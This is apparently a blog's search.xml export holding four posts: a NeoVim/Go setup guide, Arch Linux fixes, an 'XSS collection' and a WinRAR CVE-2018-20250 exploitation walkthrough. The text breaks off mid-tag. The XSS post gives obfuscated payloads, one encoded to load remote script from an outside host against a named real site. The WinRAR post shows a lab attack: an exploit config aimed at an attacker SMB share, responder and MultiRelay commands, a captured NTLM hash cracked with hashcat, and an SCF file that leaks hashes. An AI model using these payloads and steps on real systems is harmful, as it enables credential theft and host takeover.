<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NeoVim开发环境搭建之Go</title>
      <link href="/2019/06/16/Vim%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8BGo/"/>
      <url>/2019/06/16/Vim%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8BGo/</url>
      
        <content type="html"><![CDATA[<h2 id="Go环境变量"><a href="#Go环境变量" class="headerlink" title="Go环境变量"></a>Go环境变量</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ go version</span><br><span class="line">go version go1.12.5 linux/amd64</span><br><span class="line">➜  ~ </span><br><span class="line">➜  ~ go env</span><br><span class="line">GOARCH=<span class="string">"amd64"</span></span><br><span class="line">GOBIN=<span class="string">""</span></span><br><span class="line">GOCACHE=<span class="string">"/home/kali-team/.cache/go-build"</span></span><br><span class="line">GOEXE=<span class="string">""</span></span><br><span class="line">GOFLAGS=<span class="string">""</span></span><br><span class="line">GOHOSTARCH=<span class="string">"amd64"</span></span><br><span class="line">GOHOSTOS=<span class="string">"linux"</span></span><br><span class="line">GOOS=<span class="string">"linux"</span></span><br><span class="line">GOPATH=<span class="string">"/home/kali-team/.Go"</span></span><br><span class="line">GOPROXY=<span class="string">""</span></span><br><span class="line">GORACE=<span class="string">""</span></span><br><span class="line">GOROOT=<span class="string">"/usr/lib/go"</span></span><br><span class="line">GOTMPDIR=<span class="string">""</span></span><br><span class="line">GOTOOLDIR=<span class="string">"/usr/lib/go/pkg/tool/linux_amd64"</span></span><br><span class="line">GCCGO=<span class="string">"gccgo"</span></span><br><span class="line">CC=<span class="string">"gcc"</span></span><br><span class="line">CXX=<span class="string">"g++"</span></span><br><span class="line">CGO_ENABLED=<span class="string">"1"</span></span><br><span class="line">GOMOD=<span class="string">""</span></span><br><span class="line">CGO_CFLAGS=<span class="string">"-g -O2"</span></span><br><span class="line">CGO_CPPFLAGS=<span class="string">""</span></span><br><span class="line">CGO_CXXFLAGS=<span class="string">"-g -O2"</span></span><br><span class="line">CGO_FFLAGS=<span class="string">"-g -O2"</span></span><br><span class="line">CGO_LDFLAGS=<span class="string">"-g -O2"</span></span><br><span class="line">PKG_CONFIG=<span class="string">"pkg-config"</span></span><br><span class="line">GOGCCFLAGS=<span class="string">"-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build968387860=/tmp/go-build -gno-record-gcc-switches"</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><h2 id="安装gopm"><a href="#安装gopm" class="headerlink" title="安装gopm"></a>安装gopm</h2><ul><li><p>gopm的全称为Go Package Manager，即Go包管理器，由于一些众所周知的某些原因，用不了Go官方的包命令安装golang.org和gocode.org的包。</p></li><li><p>从github上安装gopm：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/gpmgo/gopm</span><br></pre></td></tr></table></figure><h2 id="安装Go-Tools"><a href="#安装Go-Tools" class="headerlink" title="安装Go Tools"></a>安装Go Tools</h2><ul><li>由于不可描述的原因，安装Go Tools要从Go官方的github仓库里clone回来自己手动安装。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/golang.org/x/</span><br></pre></td></tr></table></figure><ul><li>却换到golang.org的目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜   git <span class="built_in">clone</span> https://github.com/golang/tools</span><br><span class="line">➜   git <span class="built_in">clone</span> https://github.com/golang/lint</span><br></pre></td></tr></table></figure><ul><li>或者使用gopm安装</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜   gopm <span class="builtin-name">get</span> -g golang.org/x/tools</span><br><span class="line">➜   gopm <span class="builtin-name">get</span> -g golang.org/x/lint</span><br></pre></td></tr></table></figure><p><img src="Vim开发环境搭建之Go.assets/1560696113964.png" alt="1560696113964"></p><hr><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜   go install golang.org<span class="regexp">/x/</span>tools<span class="regexp">/cmd/gu</span>ru</span><br><span class="line">➜   go install golang.org<span class="regexp">/x/</span>tools<span class="regexp">/cmd/g</span>orename</span><br><span class="line">➜   go install golang.org<span class="regexp">/x/</span>tools<span class="regexp">/cmd/</span>fiximports</span><br><span class="line">➜   go install golang.org<span class="regexp">/x/</span>tools<span class="regexp">/cmd/g</span>opls</span><br><span class="line">➜   go install golang.org<span class="regexp">/x/</span>tools<span class="regexp">/cmd/g</span>odex</span><br></pre></td></tr></table></figure><ul><li>安装过程中可能会出现缺少依赖包的错误，缺啥装啥，然后再执行一次上面的安装命令。</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜   gopm <span class="keyword">get</span> -g golang.org/x/<span class="keyword">sync</span>/errgroup</span><br></pre></td></tr></table></figure><h2 id="安装gocode"><a href="#安装gocode" class="headerlink" title="安装gocode"></a>安装gocode</h2><ul><li>这里有一个大坑，因为我之前是有vim的现在换为neovim了，然后直接把配置文件链接到以前的vim配置文件。然而gocode如果你选择使用neovim的配置，他会在neovim的插件目录生成链接。现在干脆把之前的配置删除了，直接使用neovim的配置文件。</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜   <span class="keyword">go</span> <span class="built_in">get</span> -<span class="keyword">u</span> github.<span class="keyword">com</span>/nsf/gocode</span><br></pre></td></tr></table></figure><ul><li>设置gocode，也就是开头的Go环境变量，根据个人环境不同而定。</li></ul><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜   gocode set propose-builtins <span class="literal">true</span></span><br><span class="line">➜   gocode set <span class="class"><span class="keyword">lib</span>-<span class="title">path</span> "/<span class="title">usr</span>/<span class="title">lib</span>/<span class="title">go</span>/<span class="title">pkg</span>/<span class="title">linux_amd64</span>"</span></span><br></pre></td></tr></table></figure><ul><li>加入NeoVim配置文件，参考<a href="https://github.com/nsf/gocode/#neovim-setup" target="_blank" rel="noopener">neovim-setup</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plug <span class="string">'nsf/gocode'</span>, &#123; <span class="string">'rtp'</span>: <span class="string">'nvim'</span>, <span class="string">'do'</span>: <span class="string">'~/.config/nvim/plugged/gocode/nvim/symlink.sh'</span> &#125;</span><br></pre></td></tr></table></figure><h2 id="安装Vim-go插件"><a href="#安装Vim-go插件" class="headerlink" title="安装Vim-go插件"></a>安装Vim-go插件</h2><ul><li>我是使用vim-plug插件管理器安装的，所以只要在加载插件的地方加入</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plug <span class="string">'fatih/vim-go'</span>, &#123; <span class="string">'do'</span>: <span class="string">':GoUpdateBinaries'</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>然后重新加载init.vim文件后，PlugInstall就会自动安装了，因为我们上面已经为Vim-go安装完了Go Tools，所以是比较快就能完成的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web技术 </category>
          
          <category> 生活琐事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vim Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS收集</title>
      <link href="/2019/04/14/XSS%E6%94%B6%E9%9B%86/"/>
      <url>/2019/04/14/XSS%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="今天在朋友圈看到Wing发的"><a href="#今天在朋友圈看到Wing发的" class="headerlink" title="今天在朋友圈看到Wing发的"></a>今天在朋友圈看到Wing发的</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件传输助手</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">([,하,,,,훌]=[]+&#123;&#125;,[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)</span></span><br><span class="line"><span class="actionscript">[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+<span class="string">'(45)'</span>)()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="58某反射XSS"><a href="#58某反射XSS" class="headerlink" title="58某反射XSS"></a>58某反射XSS</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1h9amF2YXNjcmlwdDpldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAwLDExMSw5OSwxMTcsMTA5LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzksNjAsMTE1LDk5LDExNCwzOSw0MywzOSwxMDUsMTEyLDExNiw0NywxMTUsMTE0LDk5LDYxLDM0LDQ3LDQ3LDEyMCw0NiwxMTUsMTAxLDk5LDk4LDExMSwxMjAsNDYsOTksMTEwLDQ3LDEwOSw3OCw3Nyw4NCw5MCwxMDcsMzQsNjIsNjAsNDcsMTE1LDk5LDExNCwzOSw0MywzOSwxMDUsMTEyLDExNiw2MiwzOSw0MSw1OSwpKXtYfXhnb3tYfTA=&amp;type=nk</span><br></pre></td></tr></table></figure><ul><li>先把<code>document.write(&#39;&lt;scr&#39;+&#39;ipt/src=&quot;//x.secbox.cn/mNMTZk&quot;&gt;scr&#39;+&#39;ipt&gt;&#39;);</code>用FromCharCode转成下面这样</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;X&#125;javascript:<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">119</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">60</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">39</span>,<span class="number">43</span>,<span class="number">39</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">99</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">120</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">120</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">109</span>,<span class="number">78</span>,<span class="number">77</span>,<span class="number">84</span>,<span class="number">90</span>,<span class="number">107</span>,<span class="number">34</span>,<span class="number">62</span>,<span class="number">60</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">39</span>,<span class="number">43</span>,<span class="number">39</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">62</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,))&#123;X&#125;xgo&#123;X&#125;<span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>再base64编码得到最上面的</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch各种问题解决方法</title>
      <link href="/2019/04/14/Arch%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/04/14/Arch%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="安装Anaconda后Vim插件YouCompleteMe报错"><a href="#安装Anaconda后Vim插件YouCompleteMe报错" class="headerlink" title="安装Anaconda后Vim插件YouCompleteMe报错"></a>安装Anaconda后Vim插件YouCompleteMe报错</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YouCompleteMe unavailable: /opt/anaconda/lib/python3<span class="number">.7</span>/lib-dynload/_posixsubprocess.cpython<span class="number">-37</span>m-x86_64-linux-gnu.so: undefined symbol: _Py_write_noraise</span><br></pre></td></tr></table></figure><ul><li>解决方法，在.zshrc添加</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排除anaconda环境再打开VIM</span></span><br><span class="line"><span class="comment"># alias vim='PATH=`echo $PATH | sed "s/\/opt\/anaconda\/bin://"` vim'</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Wireshark免Root"><a href="#Wireshark免Root" class="headerlink" title="Wireshark免Root"></a>Wireshark免Root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd wireshark</span><br><span class="line">sudo usermod -a -G wireshark kali-team</span><br><span class="line">sudo chgrp wireshark /usr/bin/dumpcap</span><br><span class="line">sudo chmod 750 /usr/bin/dumpcap</span><br><span class="line">sudo <span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br></pre></td></tr></table></figure><h2 id="ssh密钥权限问题"><a href="#ssh密钥权限问题" class="headerlink" title="ssh密钥权限问题"></a>ssh密钥权限问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bad owner or permissions on /home/kali-team/.ssh/config</span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0664 <span class="keyword">for</span> <span class="string">'/home/kali-team/.ssh/id_rsa'</span> are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key <span class="string">"/home/kali-team/.ssh/id_rsa"</span>: bad permissions</span><br><span class="line">root@localhost: Permission denied (publickey).</span><br></pre></td></tr></table></figure><ul><li>解决方法：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 ~/.ssh/config</span><br><span class="line">chown <span class="variable">$USER</span> ~/.ssh/config</span><br><span class="line">chmod 400 ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><h2 id="HashCat"><a href="#HashCat" class="headerlink" title="HashCat"></a>HashCat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR</span><br></pre></td></tr></table></figure><ul><li>安装OpenCL的库</li></ul><h2 id="ClamTK"><a href="#ClamTK" class="headerlink" title="ClamTK"></a>ClamTK</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ clamtk </span><br><span class="line">*** unhandled exception <span class="keyword">in</span> callback:</span><br><span class="line">***   Wide character at /usr/lib/perl5/5.28/core_perl/Encode.pm line 228.</span><br><span class="line">***  ignoring at /usr/share/perl5/vendor_perl/ClamTk/GUI.pm line 145.</span><br><span class="line">*** unhandled exception <span class="keyword">in</span> callback:</span><br><span class="line">***   Wide character at /usr/lib/perl5/5.28/core_perl/Encode.pm line 228.</span><br><span class="line">***  ignoring at /usr/share/perl5/vendor_perl/ClamTk/GUI.pm line 145.</span><br></pre></td></tr></table></figure><ul><li>改desktop文件，和gnome的插件</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Comment[zh_CN]</span>=扫描威胁...</span><br><span class="line"><span class="attr">Comment[zh_TW]</span>=掃描威脅...</span><br><span class="line"><span class="attr">TryExec</span>=clamtk</span><br><span class="line"><span class="attr">Exec</span>=env LC_ALL=en_US clamtk %F</span><br><span class="line"><span class="attr">Icon</span>=clamtk</span><br><span class="line"><span class="attr">Type</span>=Application</span><br><span class="line"><span class="attr">Terminal</span>=<span class="literal">false</span></span><br><span class="line"><span class="attr">Categories</span>=GTK;GNOME;Utility;</span><br><span class="line"><span class="attr">StartupNotify</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">Keywords</span>=antivirus;virus;malware;scan;scanner;</span><br><span class="line"></span><br><span class="line"><span class="attr">TryExec</span>=clamtk</span><br><span class="line"><span class="attr">Exec</span>=env LANG=en_US clamtk %F</span><br><span class="line">os.system('env LC_TIME=C clamtk %s &amp;' % filename)</span><br></pre></td></tr></table></figure><h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cat /etc/locale.conf </span><br><span class="line">LANG=zh<span class="emphasis">_CN.UTF-8</span></span><br><span class="line"><span class="emphasis">---</span></span><br><span class="line"><span class="emphasis">zh_</span>CN.GB18030 GB18030  </span><br><span class="line">zh<span class="emphasis">_CN.GBK GBK  </span></span><br><span class="line"><span class="emphasis">zh_</span>CN.UTF-8 UTF-8  </span><br><span class="line">zh<span class="emphasis">_CN GB2312</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Arch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR代码执行复现与利用</title>
      <link href="/2019/04/14/WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/04/14/WinRAR%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table><thead><tr><th></th><th>IP</th><th>工具</th></tr></thead><tbody><tr><td>攻击主机：Arch</td><td>192.168.56.1</td><td>很多，下文讲到</td></tr><tr><td>域控：Windows 2008 R2</td><td>192.168.56.108</td><td></td></tr><tr><td>目标主机：Windows7*2</td><td>192.168.56.106/107</td><td></td></tr><tr><td>CobaltStrike：Ubuntu16.04</td><td>192.168.56.109</td></tr></tbody></table><ul><li><strong>作者：三米前有蕉皮</strong> </li><li><strong>博客：<a href="https://kali-team.cn" target="_blank" rel="noopener">https://kali-team.cn</a></strong></li><li><strong>B站【字幕】：<a href="https://www.bilibili.com/video/av44889268" target="_blank" rel="noopener">https://www.bilibili.com/video/av44889268</a></strong></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>穿透目录释放文件到开机启动菜单这些我就不演示了。</li><li>获取受害者的Net NTLM Hash</li><li>借助下载文件夹安装程序DLL劫持</li><li>投放恶意的 LNK 文件</li><li>…</li></ol><a id="more"></a><h2 id="获取受害者的Net-NTLM-Hash"><a href="#获取受害者的Net-NTLM-Hash" class="headerlink" title="获取受害者的Net-NTLM Hash"></a>获取受害者的Net-NTLM Hash</h2><ul><li><p>什么是Net NTLM Hash？请看<a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">倾旋的博客</a></p></li><li><p>工具：<a href="https://github.com/lgandx/responder/" target="_blank" rel="noopener">responder</a>、<a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></p></li></ul><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul><li>工具：<a href="https://github.com/WyAtu/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250</a></li><li>把下面的target_filename中的IP地址改成攻击者的就可以了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The archive filename you want</span></span><br><span class="line">rar_filename = <span class="string">"test.rar"</span></span><br><span class="line"><span class="comment"># The evil file you want to run</span></span><br><span class="line">evil_filename = <span class="string">"WinRAR.dll"</span></span><br><span class="line"><span class="comment"># The decompression path you want, such shown below</span></span><br><span class="line">target_filename = <span class="string">r"C:\\\192.168.56.1\smb\SHFOLDER.dll"</span></span><br><span class="line"><span class="comment"># Other files to be displayed when the victim opens the winrar</span></span><br><span class="line"><span class="comment"># filename_list=[]</span></span><br><span class="line">filename_list = [<span class="string">"hello.txt"</span>, <span class="string">"world.txt"</span>]</span><br></pre></td></tr></table></figure><ul><li><p>先查看配置文件<code>/usr/share/responder/Responder.conf</code>，检查SMB服务是否为On。</p></li><li><p>我的虚拟机使用的网卡是vboxnet0，需要root权限。通过使用参数-I指定网卡运行</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo responder -I vboxnet0 -wrfv --lm</span><br></pre></td></tr></table></figure><p><img src="WinRAR代码执行复现与利用.assets/1551196844959.png" alt="1551196844959"></p><ul><li>在这可看到IP地址为192.168.56.106的主机通过SMB共享访问了我的Arch，并获取到了用户名和Net NTLM Hash。</li></ul><p><img src="/home/kali-team/MEGAsync/Blog/source/_posts/WinRAR代码执行复现与利用.assets/1551676004216.png" alt="1551676004216"></p><ul><li>获取到Net NTLM Hash之后可以使用HashCat来暴力破解，在现在计算机性能这么强大的时代，就我的Intel 的破CPU都能跑1277.4 kH/s，不过之前要安装OpenCL的库，如果是用显卡跑就更快了。</li><li>把最后一个Hash复制出来</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Win7::Win7-PC:8a6ee201f1d2b55d:9F6527FB57FF8D60180A1D833D7CAC04:0101000000000000619F9D50ECCDD401682645F91DB02E7500000000020000000000000000000000</span><br></pre></td></tr></table></figure><ul><li>查看加密算法模块对应的编号，上面看到的是<code>NTLMv2</code>，所以我们使用5600</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ hashcat --<span class="built_in">help</span>|grep NTLM</span><br><span class="line">   5500 | NetNTLMv1                                        | Network Protocols</span><br><span class="line">   5500 | NetNTLMv1+ESS                                    | Network Protocols</span><br><span class="line">   5600 | NetNTLMv2                                        | Network Protocols</span><br><span class="line">   1000 | NTLM                                             | Operating Systems</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><p><img src="WinRAR代码执行复现与利用.assets/1551197797107.png" alt="1551197797107"></p><ul><li>截图上面我标记出来的就是密码了，只要你的字典够强大，我的字典只有一万行，一秒都不用就跑完了。</li><li>拿到密码就可以登录上去或者执行各种命令都是可以的。</li></ul><h3 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h3><ul><li>如果目标是域控就可以使用Hash中继来直接登录域内的主机。</li><li>还是打开responder的配置文件，这次是把HTTP和SMB服务改成Off，因为等一下用到另一个工具的时候要监听445和80端口。</li><li>工具：MultiRelay.py，在responder的tool目录下。</li><li>最好先切换到responder目录下，因为在获取到Windows的Shell的时候要使用MultiRelay目录里的工具。</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="keyword">cd</span> <span class="string">/usr/share/responder/tools</span></span><br><span class="line">➜  tools sudo python2 <span class="string">./MultiRelay.py</span> -t 192.168.56.106 -u ALL</span><br></pre></td></tr></table></figure><ul><li>-t后面接着是你想攻击主机的IP地址，-u是用户名，这里选择所有，就是ALL。</li><li>再打开一个终端，执行<code>➜  ~ sudo responder -I vboxnet0 -wrfv --lm</code></li><li>现在只要域控访问了Arch监听的SMB服务，就可以获取域控的Net NTLM Hash，这样就可以登录域内的主机了，基本是指哪打哪。</li></ul><p><img src="WinRAR代码执行复现与利用.assets/1551199087627.png" alt="1551199087627"></p><ul><li>截图上市已经拿到了主机：192.168.56.106的权限了，可以继续使用神器读取明文密码。但是这里上传到主机的被火绒拦截了，这也说明真的是可以控制的。</li></ul><p><img src="WinRAR代码执行复现与利用.assets/1551199449387.png" alt="1551199449387"></p><ul><li>关掉火绒试试，上传成功并获取到了明文密码。</li></ul><p><img src="WinRAR代码执行复现与利用.assets/1551199656772.png" alt="1551199656772">更多好玩的东西，自己挖掘。。。</p><h3 id="释放SCF文件"><a href="#释放SCF文件" class="headerlink" title="释放SCF文件"></a>释放SCF文件</h3><ul><li>还有一种释放.scf文件获取目标的Net NTLM Hash的，释放到磁盘的根目录，只要打开我的电脑就会访问攻击者的SMB服务，获取Hash一把梭。</li><li>新建一个文本后缀改为.scf，把下面的内容复制进去，IP地址改为攻击者的。添加进压缩包，其实解压到能看到的地方都可以触发。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">IconFile</span>=\\<span class="number">192.168</span>.<span class="number">56.1</span>\icon.ico</span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure><ul><li>当然还有desktop.ini、autorun.inf这些可以设置icon图标和设置文件夹的背景图片的，也可以使用file协议远程加载攻击者的SMB服务，高中就经常设置U盘图标和U盘的背景图片装逼的了，没想到现在还有这些用处。</li></ul><h2 id="借助下载文件夹安装程序DLL劫持"><a href="#借助下载文件夹安装程序DLL劫持" class="headerlink" title="借助下载文件夹安装程序DLL劫持"></a>借助下载文件夹安装程序DLL劫持</h2><ul><li>DLL劫持是什么？还是看<a href="http://payloads.online/archivers/2018-06-09/1" target="_blank" 